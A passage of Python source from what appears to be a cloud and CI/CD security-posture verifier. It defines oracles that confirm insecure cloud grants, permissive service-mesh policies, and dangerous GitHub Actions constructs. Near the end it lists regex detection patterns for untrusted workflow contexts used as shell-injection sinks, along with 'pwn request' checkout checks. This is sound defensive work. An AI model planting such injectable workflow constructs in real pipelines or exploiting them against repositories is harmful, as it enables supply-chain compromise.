    r"^serviceaccount:[^@\s]+@(?P<proj>[a-z0-9][a-z0-9-]{4,28}[a-z0-9])\.iam\.gserviceaccount\.com$")
_GCP_MEMBER_RE = re.compile(
    r"^(?:user|group|domain):(?:[^@\s]+@)?(?P<domain>[a-z0-9][a-z0-9.-]*\.[a-z]{2,})$")
# A GCP project id (no dots) vs a dotted identity/DNS domain — used to give every parsed account a NAMESPACE
# so a project owner is never compared against a user's email domain (the red-pen BLOCK-1 category error).
_GCP_PROJECT_RE = re.compile(r"^[a-z][a-z0-9-]{4,28}[a-z0-9]$")
_DOMAIN_RE = re.compile(r"^[a-z0-9-]+(?:\.[a-z0-9-]+)+$")


def _cloud_tri_bool(value: Any) -> bool | None:
    """Coerce a retained flag to True / False / None (unknown). A bool passes through; a string is
    read for an unambiguous enabled/disabled token; anything else (incl. absent) is UNKNOWN (None) — so
    an ABSENT or un-parseable flag can never be mistaken for an EXPLICIT insecure setting (near-zero-FP)."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int,)) and not isinstance(value, bool):
        return bool(value)
    if isinstance(value, str):
        v = value.strip().lower()
        if v in ("true", "1", "yes", "on", "enabled", "enable"):
            return True
        if v in ("false", "0", "no", "off", "disabled", "disable"):
            return False
    return None


def _cloud_norm_principal(p: Any) -> str:
    return _coerce_text(p)[:_CLOUD_STR_CAP].strip().lower().replace("-", "").replace("_", "")


def _cloud_is_anon_principal(p: Any) -> bool:
    norm = _cloud_norm_principal(p)
    return norm in {a.replace("-", "").replace("_", "") for a in _CLOUD_ANON_PRINCIPALS}


def _canon_account_token(value: Any, *, bare_ok: bool = False) -> str | None:
    """Canonicalise a cloud principal OR an owner token into a NAMESPACED account token — the sound unit the
    cross-account rule (P4) compares. Applied to BOTH the grantee principal AND the charter-threaded owner
    token, so they are always compared in the SAME namespace (the red-pen BLOCK-1 fix: a project owner is
    never compared against a user's email *domain*) and the owner side is parsed exactly like the principal
    side (the BLOCK-2 fix: an owner threaded as a full ARN / prefixed / labelled form no longer mismatches a
    same-account grant).

    Returns one of ``aws:<12-digit>`` / ``project:<gcp-project-id>`` (owner tokens only) / ``domain:<dns-domain>``,
    or ``None`` when NO account can be SOUNDLY canonicalised (a resource ARN with an empty account field, a
    non-12-digit account, ANY GCP ``serviceAccount:`` PRINCIPAL — its cross-project status is not soundly
    distinguishable by email from a benign Google-managed service agent; see blocking_work — a labelled/opaque/
    leading-zero-dropped token) — so the rule NEVER fires on an un-attributable account (an unknown is never
    guessed cross-account, near-zero-FP).

    Accepts an EXPLICIT namespace prefix (``aws:`` / ``project:`` / ``domain:``) and the STRUCTURED forms
    that are soundly attributable: a 12-digit id, an ARN, a GCP ``user:``/``group:``/``domain:`` member.
    A GCP ``serviceAccount:`` member returns ``None`` (LEAD, not a FACT). ``bare_ok``
    additionally infers a BARE (unprefixed) ``<fqdn>`` → domain / ``<gcp-id>`` → project — this is enabled
    ONLY for a TRUSTED owner token, NEVER for a resource-policy PRINCIPAL (attacker-influenced): a bare FQDN
    on the principal side is an AWS service principal (``cloudtrail.amazonaws.com``), an OIDC issuer
    (``token.actions.githubusercontent.com``), or an IP — none is a cross-account trust, and a real external
    GCP domain grant always carries a member-type prefix (handled above), so refusing a bare-FQDN principal
    loses no true-positive (red-pen BLOCK-3). A token that fits none is ``None`` (unusable, never guessed)."""
    s = _coerce_text(value).strip()
    if not s:
        return None
    low = s.lower()
    # Explicit namespace prefix (an owner token may be threaded this way for zero ambiguity).
    for ns, rex in (("aws:", _AWS_ACCOUNT_RE), ("project:", _GCP_PROJECT_RE), ("domain:", _DOMAIN_RE)):
        if low.startswith(ns):
            rest = low[len(ns):].strip()
            return ns + rest if rex.match(rest) else None
    # A bare AWS account-id (AWS names a whole-account principal as just the 12-digit id).
    if _AWS_ACCOUNT_RE.match(low):
        return "aws:" + low
    # An AWS ARN — the account is the 5th ':'-delimited field, counted only if it is exactly 12 digits
    # (a service ARN with an empty account field, e.g. ``arn:aws:s3:::bucket``, is NOT attributable).
    if low.startswith("arn:"):
        parts = low.split(":")
        if len(parts) >= 5 and _AWS_ACCOUNT_RE.match(parts[4]):
            return "aws:" + parts[4]
        return None
    # A GCP serviceAccount member is NOT soundly attributable as CROSS-PROJECT from its email alone -> None
    # (LEAD, never a FACT). A GOOGLE-MANAGED service agent (bigquery-encryption / dlp-api / gcp-sa-* / *-robot /
    # …, granted CMEK/DLP/log-sink) is INDISTINGUISHABLE by email from an external CUSTOMER SA, and the
    # Google-agent project set CANNOT be enumerated completely (Google adds agents), so any allow/deny list is
    # fail-open — a benign agent WOULD fire a false cross-account FACT (red-pen BLOCK-A/BLOCK-B). So a
    # serviceAccount grant stays an honest LEAD. blocking_work: sound GCP-SA-cross-project needs an
    # authoritative Google-service-agent registry OR an owner-supplied trusted-external-project allowlist.
    # (GCP cross-DOMAIN user/group below, and AWS cross-account above, remain sound FACTs.)
    if _GCP_SA_RE.match(low):
        return None
    # A GCP user/group/domain member -> its DOMAIN namespace.
    m = _GCP_MEMBER_RE.match(low)
    if m:
        return "domain:" + m.group("domain")
    # A BARE (unprefixed) token is inferred as a domain/project ONLY for a trusted OWNER token — never for an
    # attacker-influenced principal (red-pen BLOCK-3: a bare FQDN principal is a service principal / OIDC
    # issuer / IP, not a cross-account trust; a real external domain grant carries a member-type prefix above).
    if bare_ok:
        if _DOMAIN_RE.match(low):
            return "domain:" + low
        if _GCP_PROJECT_RE.match(low):
            return "project:" + low
    return None


def _cloud_owner_accounts(control: Mapping[str, Any]) -> set[str]:
    """The resource OWNER's own-account set the cross-account rule (P4) compares a named grantee against —
    the engagement's authorized own-account id(s) threaded into the RETAINED control by the capture
    (charter-supplied). Read from ``owner_account`` (scalar) and ``owner_accounts`` (list), at the control
    top-level AND inside a nested ``achieved_state``. Each token is run through :func:`_canon_account_token`
    — the SAME canonicaliser the grantee principal goes through — so an owner threaded as a bare id, a full
    ARN, a ``project:``/``domain:``/``aws:`` prefix, or a GCP project/domain all reduce to the same namespaced
    form the principal is compared against (red-pen BLOCK-2). A token that will not canonicalise (a labelled
    id, a leading-zero-dropped numeric, an opaque string) is DROPPED — never a partial/lossy match.

    Absent (or nothing canonicalises) -> the empty set -> the cross-account rule stays an honest LEAD: the
    owner is NEVER guessed, so an intended same-account grant can never be mistaken for a cross-account one."""
    out: set[str] = set()
    scopes: list[Any] = [control]
    inner = control.get("achieved_state")
    if isinstance(inner, Mapping):
        scopes.append(inner)
    for src in scopes:
        if not isinstance(src, Mapping):
            continue
        candidates: list[Any] = []
        one = src.get("owner_account")
        if one is not None:
            candidates.append(one)
        many = src.get("owner_accounts")
        if isinstance(many, (list, tuple)):
            candidates.extend(many[:_CLOUD_MAX_PRINCIPALS])
        for a in candidates:
            tok = _canon_account_token(a, bare_ok=True)   # owner tokens are TRUSTED (charter-supplied)
            if tok:
                out.add(tok)
    return out


def _cloud_achieved_state(control: Mapping[str, Any]) -> dict[str, Any]:
    """The achieved-state view the rules judge. Accepts a nested ``achieved_state`` sub-dict OR a flat
    resource record (``sensors.cloud`` resources carry public/sensitive/encrypted/grants at top level).
    Principals are gathered from an explicit ``principals`` list AND from ``grants[].principal`` so a
    ScoutSuite/Prowler-shaped or a native inventory record are both judged the same way."""
    src = control.get("achieved_state") if isinstance(control.get("achieved_state"), Mapping) else control
    principals: list[str] = []
    raw_principals = src.get("principals")
    if isinstance(raw_principals, (list, tuple)):
        principals.extend(_coerce_text(p) for p in raw_principals[:_CLOUD_MAX_PRINCIPALS])
    grants = src.get("grants")
    if isinstance(grants, (list, tuple)):
        for g in grants[:_CLOUD_MAX_PRINCIPALS]:
            if isinstance(g, Mapping) and g.get("principal") is not None:
                principals.append(_coerce_text(g.get("principal")))
    return {
        "encrypted": _cloud_tri_bool(src.get("encrypted")),
        "public": _cloud_tri_bool(src.get("public")),
        "sensitive": _cloud_tri_bool(src.get("sensitive")),
        "principals": principals,
    }


def cloud_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a retained cloud/CSPM posture control PROVABLY carries an insecure ACHIEVED STATE — the
    membership/parse-proof that promotes a ``sensors.cloud`` posture LEAD to a FACT over the control's
    achieved state ALONE (offline, ZERO cloud calls). The achieved-state sibling of ``k8s_posture_oracle``:
    a CSPM tool's "public / mis-configured" is a third-party heuristic; this oracle re-derives the insecure
    state over the RETAINED control so the scanner's verdict is never rubber-stamped and a benign posture
    is never confirmed.

    ``observed_control`` is the JSON-safe retained control (a nested ``achieved_state`` sub-dict, or a flat
    ``sensors.cloud`` resource record)::

        {"control_id": "s3-encryption-at-rest"?, "resource_id": "acme-secrets"?, "status": "FAIL"?,
         "provider": "aws"?, "owner_account": "111122223333"? / "owner_accounts": ["111122223333"]?,
         "achieved_state": {"encrypted": false, "public": false, "sensitive": true,
                            "principals": ["arn:aws:iam::123:role/app"]}}
        # or flat: {"id": "acme-secrets", "encrypted": false, "sensitive": true, "public": false,
        #           "grants": [{"principal": "*", "access": "read"}]}

    Fires (0.9) only when an EXPLICIT insecure achieved-state flag holds (fixed rule order):
      1. ``encryption_at_rest_disabled`` — ``encrypted`` explicitly ``false`` AND the resource is
         ``sensitive`` (the exact ``cloud_posture_leads`` ``misconfiguration`` condition — the lead the
         POLICY_PATH oracle STRUCTURALLY cannot prove, now provable as an achieved STATE);
      2. ``public_exposure`` — ``public`` explicitly ``true`` (an achieved public-access state);
      3. ``wildcard_principal`` — a wildcard/anonymous principal (``*`` / ``AllUsers`` / ``anonymous`` / …)
         literally named in the retained resource policy (``principals`` or ``grants[].principal``);
      4. ``named_cross_account_principal`` (P4) — a NAMED principal whose parsed account/project is NOT in
         the retained ``owner_account`` / ``owner_accounts`` set (the charter's authorized own-account
         id(s), threaded into the capture). SOUNDNESS: this fires ONLY when that owner set is present AND a
         named grantee's account parses AND differs. Absent owner set (unknown owner) or an un-parseable
         principal account -> stays a LEAD (an intended same-account grant is NEVER promoted; the owner is
         never guessed).

    Does NOT fire (stays an honest LEAD) when: the control records an EXPLICIT compliant/pass status; the
    flags show the SECURE setting (``encrypted`` true, ``public`` false, no wildcard principal, only
    same-account named principals); no owner-account set was threaded in; or every relevant flag is
    ABSENT/unknown (unknown is never an insecure fact). Malformed / non-mapping evidence -> non-fire (never
    raises). Pure + deterministic, so the same verdict re-verifies offline from the retained context.
    GROUNDING is procedural exactly as for every oracle: the control MUST be the sensor's RETAINED cloud
    evidence, never a re-run of a live cloud call laundered as a fact."""
    if not isinstance(observed_control, Mapping):
        return OracleSignal(kind=OracleKind.CLOUD_POSTURE, fired=False, confidence=0.0,
                            evidence="no cloud posture control evidence")
    ctl = observed_control
    rid = _coerce_text(ctl.get("resource_id") or ctl.get("id"))[:_CLOUD_STR_CAP].strip()
    cid = _coerce_text(ctl.get("control_id") or ctl.get("check_id"))[:_CLOUD_STR_CAP].strip()
    status = _coerce_text(ctl.get("status")).strip().lower()
    label = rid or cid or "?"

    # Respect an EXPLICIT compliant verdict — a control the CSPM tool passed is never promoted.
    if status in _CLOUD_COMPLIANT_STATUSES:
        return OracleSignal(
            kind=OracleKind.CLOUD_POSTURE, fired=False, confidence=0.0,
            evidence=(f"cloud control {label} records a compliant status {status!r} — not an insecure "
                      f"achieved state (stays a lead)"),
            observed={"resource_id": rid, "control_id": cid, "status": status})

    state = _cloud_achieved_state(ctl)
    encrypted, public, sensitive = state["encrypted"], state["public"], state["sensitive"]
    anon = [p for p in state["principals"] if _cloud_is_anon_principal(p)]

    # Rule 1 — encryption-at-rest DISABLED on a sensitive datastore (the misconfiguration lead the
    # policy-path oracle cannot prove; provable here as an achieved STATE). EXPLICIT false + sensitive.
    if encrypted is False and sensitive is True:
        return OracleSignal(
            kind=OracleKind.CLOUD_POSTURE, fired=True, confidence=0.9,
            evidence=(f"cloud posture fact: sensitive resource {label} has encryption-at-rest DISABLED "
                      f"(achieved state: encrypted=false, sensitive=true) — the un-reachability-provable "
                      f"misconfiguration lead, promoted over the retained achieved state"),
            observed={"resource_id": rid, "control_id": cid, "rule": "encryption_at_rest_disabled",
                      "reason": "insecure_achieved_state", "encrypted": False, "sensitive": True})

    # Rule 2 — an achieved PUBLIC-EXPOSURE flag (explicitly public).
    if public is True:
        return OracleSignal(
            kind=OracleKind.CLOUD_POSTURE, fired=True, confidence=0.9,
            evidence=(f"cloud posture fact: resource {label} is PUBLICLY EXPOSED "
                      f"(achieved state: public=true) — promoted over the retained achieved state"),
            observed={"resource_id": rid, "control_id": cid, "rule": "public_exposure",
                      "reason": "insecure_achieved_state", "public": True})

    # Rule 3 — a wildcard/anonymous principal literally named in the retained resource policy.
    if anon:
        who = anon[0]
        return OracleSignal(
            kind=OracleKind.CLOUD_POSTURE, fired=True, confidence=0.9,
            evidence=(f"cloud posture fact: resource {label} grants a WILDCARD/anonymous principal "
                      f"{who!r} (achieved state: an anonymous grantee is named in the retained policy) — "
                      f"promoted over the retained achieved state"),
            observed={"resource_id": rid, "control_id": cid, "rule": "wildcard_principal",
                      "reason": "insecure_achieved_state", "principal": who})

    # Rule 4 — a NAMED principal in a DIFFERENT account than the resource owner (P4: cross-account trust).
    # SOUNDNESS (CLAIM-DISCIPLINE): distinguishing an INTENDED same-account grant from a risky CROSS-account
    # one REQUIRES the owner's own-account id(s). So this fires ONLY when the retained control threads an
    # owner-account set AND a named grantee parses to an account NOT in that set. With no owner account
    # (unknown), or a principal whose account cannot be parsed, it stays an honest LEAD — an intended
    # internal grant is never promoted, and an un-attributable principal is never guessed cross-account.
    owner_accounts = _cloud_owner_accounts(ctl)
    if owner_accounts:
        owner_namespaces = {t.split(":", 1)[0] for t in owner_accounts}
        for p in state["principals"]:
            if _cloud_is_anon_principal(p):
                continue  # a wildcard/anonymous grantee is rule 3's job, not a named cross-account grant
            acct = _canon_account_token(p, bare_ok=False)  # a PRINCIPAL is untrusted: no bare-FQDN inference
            if acct is None:
                continue  # an un-attributable principal is never guessed cross-account (stays a lead)
            # NAMESPACE AGREEMENT (red-pen BLOCK-1): only compare within the SAME namespace. If NO owner
            # token shares this principal's namespace (e.g. a user's DOMAIN vs a project-only owner set), we
            # cannot tell whether it is the org's own identity -> refuse (stay a LEAD), never fire.
            if acct.split(":", 1)[0] not in owner_namespaces:
                continue
            if acct not in owner_accounts:
                owners_disp = ", ".join(sorted(owner_accounts))
                return OracleSignal(
                    kind=OracleKind.CLOUD_POSTURE, fired=True, confidence=0.9,
                    evidence=(f"cloud posture fact: resource {label} grants a NAMED principal {p!r} in a "
                              f"DIFFERENT account ({acct}) than the owner ({owners_disp}) — a cross-account "
                              f"trust the retained policy names, promoted over the achieved state (the "
                              f"owner-account set was threaded into the retained control in the SAME "
                              f"namespace, so this is not a guess)"),
                    observed={"resource_id": rid, "control_id": cid,
                              "rule": "named_cross_account_principal", "reason": "insecure_achieved_state",
                              "principal": p, "principal_account": acct.split(":", 1)[1],
                              "owner_accounts": sorted(t.split(":", 1)[1] for t in owner_accounts)})

    return OracleSignal(
        kind=OracleKind.CLOUD_POSTURE, fired=False, confidence=0.0,
        evidence=(f"cloud control {label} carries no EXPLICIT insecure achieved-state flag "
                  f"(encryption on / not public / no wildcard principal, or flags absent) — not provably "
                  f"an insecure state (stays a lead)"),
        observed={"resource_id": rid, "control_id": cid, "status": status,
                  "encrypted": encrypted, "public": public, "sensitive": sensitive})


# ---------------------------------------------------------------------------
# Service-mesh posture — promote a retained mesh-config LEAD to a FACT over its ACHIEVED STATE
# (Wave-G3). The MESH twin of ``k8s_posture_oracle`` / ``cloud_posture_oracle``.
#
# A mesh linter / config export reports "PeerAuthentication is PERMISSIVE" or "this AuthorizationPolicy
# allows everyone". That is a THIRD-PARTY LEAD — a `fact` only when a deterministic oracle proves a
# CONCRETE insecure ACHIEVED STATE over the RETAINED mesh config. This oracle re-derives the weakness over
# ONE retained control (a single-record membership/parse-proof, NO kubectl, NO mesh API, NO graph
# traversal, NO ATTACK) — mirroring how ``cloud_posture_oracle`` judges one retained cloud control.
#
# A control fires ONLY on an EXPLICIT insecure achieved-state a HARDENED mesh cannot exhibit; the rule
# order is fixed so the verdict is deterministic (same evidence -> same signal). A STRICT PeerAuthentication,
# a scoped/deny AuthorizationPolicy, an ALLOW policy with no rules (deny-all), an authenticated Linkerd
# inbound policy, or only ABSENT/unknown fields all correctly do NOT fire — near-zero false positives by
# construction. Malformed / non-mapping evidence -> non-fire (never raises).
_MESH_STR_CAP = 4096
_MESH_MAX_RULES = 4096

# Istio PeerAuthentication effective mTLS modes that ACCEPT plaintext transport (a STRICT mesh cannot
# exhibit these). UNSET/absent is NOT here — an absent mode inherits a parent and is never promoted.
_MESH_PERMISSIVE_MTLS = frozenset({"permissive", "disable"})
# Linkerd server ``default-inbound-policy`` values that admit any (even unmeshed / unauthenticated) client.
_MESH_UNAUTH_INBOUND = frozenset({"all-unauthenticated", "all_unauthenticated"})
# Principals that denote "anyone" in an Istio AuthorizationPolicy ``from.source`` clause.
_MESH_ANON_PRINCIPALS = frozenset({"*"})
# A linter/validator's own PASS/compliant verdict is respected: the oracle never promotes a passing control
# (mirrors how k8s requires a hard FAIL and cloud respects an explicit compliant status).
_MESH_COMPLIANT_STATUSES = frozenset({
    "pass", "passed", "ok", "compliant", "info", "informational", "not_applicable",
    "na", "n/a", "skipped", "manual",
})


def _mesh_authz_allows_all(action: Any, rules: Any) -> tuple[bool, str]:
    """True iff an Istio AuthorizationPolicy provably admits EVERY caller. Fires only when ``action`` is
    ``ALLOW`` (or unset — Istio's default action is ALLOW) AND a rule matches everyone: an EMPTY catch-all
    rule (no ``from`` / ``to`` / ``when`` — matches every request) or a ``*`` wildcard PEER principal named
    in a ``from.source.principals`` clause. NOTE: ``requestPrincipals: ["*"]`` is deliberately NOT treated
    as allow-all — a ``*`` request principal REQUIRES a valid JWT (any authenticated caller), which is the
    RECOMMENDED Istio "require a valid token" posture, not an anonymous grant (the review's false positive).
    An ALLOW policy with NO rules is DENY-all
    (secure -> no fire); a ``DENY`` / ``CUSTOM`` / ``AUDIT`` action is never an allow-all grant. A rule that
    restricts by ``to`` (path/method) but omits ``from`` is deliberately NOT treated as allow-all — an
    operator publishing a public endpoint is a design choice, not a near-zero-FP-provable misconfig."""
    act = _coerce_text(action).strip().upper() or "ALLOW"   # Istio default action is ALLOW
    if act != "ALLOW":
        return (False, "")
    if not isinstance(rules, (list, tuple)):
        return (False, "")
    for rule in list(rules)[:_MESH_MAX_RULES]:
        if not isinstance(rule, Mapping):
            continue
        froms, tos, whens = rule.get("from"), rule.get("to"), rule.get("when")
        # an entirely empty rule matches EVERY request (any source, any operation) -> allow-all.
        if not froms and not tos and not whens:
            return (True, "empty_catch_all_rule")
        # a `*` wildcard principal literally named in a from.source clause -> all principals.
        if isinstance(froms, (list, tuple)):
            for f in froms:
                if not isinstance(f, Mapping):
                    continue
                src = f.get("source")
                if not isinstance(src, Mapping):
                    continue
                # ONLY the mTLS PEER-identity `principals` — a `*` there is anonymous-peer allow-all.
                # `requestPrincipals` (JWT identity) is excluded: `*` there requires a valid token.
                vals = src.get("principals")
                if isinstance(vals, (list, tuple)) and any(
                        _coerce_text(v).strip() in _MESH_ANON_PRINCIPALS for v in vals):
                    return (True, "wildcard_principal")
    return (False, "")


def mesh_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a retained service-mesh posture control PROVABLY carries an insecure ACHIEVED STATE — the
    membership/parse-proof that promotes a mesh-config LEAD to a FACT over the control's achieved state
    ALONE (offline, ZERO mesh/kubectl calls, NO attack). The MESH twin of ``cloud_posture_oracle``: a mesh
    linter's "permissive / allows everyone" is a third-party heuristic; this oracle re-derives the insecure
    state over the RETAINED control so the scanner's verdict is never rubber-stamped and a hardened mesh is
    never confirmed.

    ``observed_control`` is the JSON-safe retained control (``verify.mesh_posture.ingest_mesh_config``
    mints it from an Istio / Linkerd manifest)::

        {"resource_kind": "PeerAuthentication", "name": "default", "namespace": "istio-system",
         "scope": "mesh", "mtls_mode": "PERMISSIVE"}
        {"resource_kind": "AuthorizationPolicy", "name": "ns-allow", "namespace": "prod",
         "scope": "namespace", "action": "ALLOW", "rules": [{}]}
        {"resource_kind": "Server", "name": "web", "namespace": "prod",
         "default_inbound_policy": "all-unauthenticated"}   # Linkerd

    Fires (0.9) only when an EXPLICIT insecure achieved-state holds (fixed rule order):
      1. ``permissive_mtls`` — an Istio PeerAuthentication whose effective ``mtls_mode`` is ``PERMISSIVE``
         or ``DISABLE`` (plaintext transport is accepted — a STRICT-mTLS mesh cannot exhibit this);
      2. ``authz_allow_all`` — an Istio AuthorizationPolicy (``action: ALLOW`` or unset) that provably
         admits EVERY caller: an empty catch-all rule, or a ``*`` wildcard principal named in a from-clause;
      3. ``linkerd_unauthenticated`` — a Linkerd server whose ``default_inbound_policy`` is
         ``all-unauthenticated`` (any client, even unmeshed / unauthenticated, may connect).

    Does NOT fire (stays an honest LEAD) when: the control records an EXPLICIT compliant/pass status; the
    achieved state is hardened (STRICT mTLS, a scoped or DENY policy, an ALLOW policy with no rules =
    deny-all, an authenticated Linkerd policy); or the relevant field is ABSENT/unknown (an absent mTLS
    mode inherits a parent and is never promoted). Malformed / non-mapping evidence -> non-fire (never
    raises). Pure + deterministic, so the same verdict re-verifies offline from the retained context.
    GROUNDING is procedural exactly as for every oracle: the control MUST be the RETAINED mesh evidence,
    never a re-run of a live mesh call laundered as a fact."""
    if not isinstance(observed_control, Mapping):
        return OracleSignal(kind=OracleKind.MESH_POSTURE, fired=False, confidence=0.0,
                            evidence="no service-mesh control evidence")
    ctl = observed_control
    kind = _coerce_text(ctl.get("resource_kind") or ctl.get("kind"))[:_MESH_STR_CAP].strip()
    name = _coerce_text(ctl.get("name"))[:_MESH_STR_CAP].strip()
    ns = _coerce_text(ctl.get("namespace"))[:_MESH_STR_CAP].strip()
    scope = _coerce_text(ctl.get("scope"))[:_MESH_STR_CAP].strip().lower()
    status = _coerce_text(ctl.get("status")).strip().lower()
    label = name or kind or "?"

    # Respect an EXPLICIT compliant verdict — a control a linter passed is never promoted.
    if status in _MESH_COMPLIANT_STATUSES:
        return OracleSignal(
            kind=OracleKind.MESH_POSTURE, fired=False, confidence=0.0,
            evidence=(f"mesh control {label} records a compliant status {status!r} — not an insecure "
                      f"achieved state (stays a lead)"),
            observed={"name": name, "namespace": ns, "status": status})

    # Rule 1 — Istio PeerAuthentication DECLARES mTLS mode PERMISSIVE / DISABLE (plaintext accepted as
    # configured). This is the DECLARED configuration, not proven effective runtime: mode inheritance,
    # namespace/workload selectors and more-specific policies can change the effective result (not evaluated).
    mtls_mode = _coerce_text(ctl.get("mtls_mode")).strip().lower()
    if mtls_mode in _MESH_PERMISSIVE_MTLS:
        return OracleSignal(
            kind=OracleKind.MESH_POSTURE, fired=True, confidence=0.9,
            evidence=(f"service-mesh declared-configuration fact: PeerAuthentication {label} (scope "
                      f"{scope or '?'}) DECLARES mTLS mode {mtls_mode.upper()} — as configured, plaintext "
                      f"transport is accepted (a STRICT-mTLS declaration cannot); re-derived over the retained "
                      f"manifest construct. This is the declared config, not proven effective runtime (policy "
                      f"precedence/selectors not evaluated)"),
            observed={"name": name, "namespace": ns, "scope": scope, "rule": "permissive_mtls",
                      "mtls_mode": mtls_mode.upper(), "reason": "permissive_declared_configuration"})

    # Rule 2 — Istio AuthorizationPolicy (action ALLOW / unset) whose rule, AS DECLARED, admits every caller.
    allows_all, why = _mesh_authz_allows_all(ctl.get("action"), ctl.get("rules"))
    if allows_all:
        return OracleSignal(
            kind=OracleKind.MESH_POSTURE, fired=True, confidence=0.9,
            evidence=(f"service-mesh declared-configuration fact: AuthorizationPolicy {label} (scope "
                      f"{scope or '?'}) with action ALLOW DECLARES a rule that admits every caller ({why}) — "
                      f"no principal is required as configured; re-derived over the retained manifest construct. "
                      f"This is the declared config, not proven effective runtime (policy precedence/selectors "
                      f"not evaluated)"),
            observed={"name": name, "namespace": ns, "scope": scope, "rule": "authz_allow_all",
                      "detail": why, "reason": "permissive_declared_configuration"})

    # Rule 3 — Linkerd server DECLARES default-inbound-policy all-unauthenticated (any client, as configured).
    inbound = _coerce_text(ctl.get("default_inbound_policy") or ctl.get("inbound_policy")).strip().lower()
    if inbound in _MESH_UNAUTH_INBOUND:
        return OracleSignal(
            kind=OracleKind.MESH_POSTURE, fired=True, confidence=0.9,
            evidence=(f"service-mesh declared-configuration fact: Linkerd server {label} DECLARES "
                      f"default-inbound-policy 'all-unauthenticated' — as configured, any client (even "
                      f"unmeshed / unauthenticated) may connect; re-derived over the retained manifest "
                      f"construct. Declared config, not proven effective runtime"),
            observed={"name": name, "namespace": ns, "rule": "linkerd_unauthenticated",
                      "inbound_policy": inbound, "reason": "permissive_declared_configuration"})

    return OracleSignal(
        kind=OracleKind.MESH_POSTURE, fired=False, confidence=0.0,
        evidence=(f"mesh control {label} carries no EXPLICIT permissive-mTLS / allow-all-authz / "
                  f"unauthenticated-inbound achieved state (STRICT mTLS / scoped or deny policy / "
                  f"authenticated inbound, or fields absent) — not provably an insecure state (stays a lead)"),
        observed={"name": name, "namespace": ns, "kind": kind, "scope": scope, "status": status,
                  "mtls_mode": mtls_mode, "inbound_policy": inbound})


# ---------------------------------------------------------------------------
# CI/CD posture — a parsed GitHub-Actions control provably carries a dangerous construct
# ---------------------------------------------------------------------------
#
# Phase-2: promote a parsed workflow control (verify.cicd_posture.ingest_workflow / sensors.cicd) to a
# FACT by RE-DERIVING the danger over the RETAINED control — never trusting the ingest's rule label. Each
# rule fires only on a concrete, literal construct a benign workflow does not carry (near-zero-FP):
#   * unpinned_action  — a THIRD-PARTY action (owner/repo@ref, owner not actions/github, not ./local or
#     docker://) pinned to a MUTABLE ref (ref is not a 40-hex commit SHA). SHA-pinned / first-party /
#     local do NOT fire.
#   * pwn_request      — `on: pull_request_target` AND a checkout of the UNTRUSTED PR head (head.sha /
#     head.ref / github.head_ref / refs/pull/*). A plain `pull_request` trigger, or a base checkout, do
#     NOT fire.
#   * script_injection — a `run:` shell body that INTERPOLATES an untrusted `${{ github.event.*.title|
#     body|... }}` / `${{ github.head_ref }}` expression (a shell-injection sink). A run with no untrusted
#     `${{ }}` does NOT fire.
# Pure + deterministic (re-verifies offline); ReDoS-safe (length-capped, fixed-alternation).
_CICD_VALUE_CAP = 8192
_SHA40_RE = re.compile(r"^[0-9a-fA-F]{40}$")
_CICD_FIRST_PARTY = frozenset({"actions", "github"})
_ACTION_REF_RE = re.compile(r"^([^/@\s]+)/([^@\s]+)@(\S+)$")
# Attacker-controllable Actions context REFERENCES as boundary-anchored regexes (NOT substrings — review
# wp7kachv5): a reference matches only as a WHOLE property path at an INJECTABLE TEXT leaf, so a longer/
# other path (`github.event.commits[0].id` — a SHA; `.timestamp`; `.url`), a different prefix
# (`mygithub…`, `github.event.commits_url`), and a quoted STRING LITERAL (which never dereferences a
# context) do NOT fire. `(?<![\w.])` / `(?![\w.])` are the identifier boundaries.
_QUOTED_LIT_RE = re.compile(r"'[^']*'|\"[^\"]*\"")
_UNTRUSTED_CTX_RES: tuple["re.Pattern[str]", ...] = tuple(re.compile(p, re.I) for p in (
    r"(?<![\w.])github\.head_ref(?![\w.])",
    r"(?<![\w.])github\.event\.issue\.(?:title|body)(?![\w.])",
    r"(?<![\w.])github\.event\.pull_request\.(?:title|body)(?![\w.])",
    r"(?<![\w.])github\.event\.pull_request\.head\.(?:ref|label)(?![\w.])",
    r"(?<![\w.])github\.event\.comment\.body(?![\w.])",
    r"(?<![\w.])github\.event\.(?:review|review_comment)\.body(?![\w.])",
    r"(?<![\w.])github\.event\.discussion\.(?:title|body)(?![\w.])",
    r"(?<![\w.])github\.event\.head_commit\.(?:message|author\.(?:name|email))(?![\w.])",
    # array contexts: an INDEX/wildcard then an injectable TEXT leaf ONLY (never .id/.sha/.timestamp/.url).
    r"(?<![\w.])github\.event\.commits(?:\[[^\]]*\]|\.\*)?\.(?:message|author\.(?:name|email))(?![\w.])",
    r"(?<![\w.])github\.event\.pages(?:\[[^\]]*\]|\.\*)?\.page_name(?![\w.])",
))
_UNTRUSTED_PR_CHECKOUT_RE = re.compile(
    r"(?i)(github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|refs/pull/)")
_INTERP_RE = re.compile(r"\$\{\{(.+?)\}\}", re.S)


def _cicd_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.CICD_POSTURE, fired=fired, confidence=(conf if fired else 0.0),
                        evidence=evidence, observed=observed)


def cicd_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a parsed GitHub-Actions control PROVABLY carries a dangerous construct — a re-verifiable
    parse-proof over the RETAINED control that promotes ``verify.cicd_posture`` / ``sensors.cicd``'s
    workflow LEAD to a FACT. Never trusts the ingest's rule label: it re-derives the danger from the
    literal evidence, so a benign workflow (SHA-pinned action, plain ``pull_request``, no untrusted
    interpolation) never fires. Pure + deterministic; re-verifies offline. Never raises."""
    if not isinstance(observed_control, Mapping):
        return _cicd_signal(False, evidence="no CI/CD control evidence", observed={})
    ctl = observed_control
    rule = _coerce_text(ctl.get("rule")).strip().lower()
    wf = _coerce_text(ctl.get("workflow")).strip()
    job = _coerce_text(ctl.get("job")).strip()
    loc = (wf or "?") + (f" job {job}" if job else "")

    if rule == "unpinned_action":
        uses = _coerce_text(ctl.get("uses"))[:_CICD_VALUE_CAP].strip()
        m = _ACTION_REF_RE.match(uses)
        if m is None:
            return _cicd_signal(False, evidence=f"{uses!r} is not an owner/repo@ref action reference",
                                observed={"rule": rule, "uses": uses})
        owner, repo, ref = m.group(1), m.group(2), m.group(3)
        if owner.lower() in _CICD_FIRST_PARTY or uses.startswith("./") or uses.startswith("docker://"):
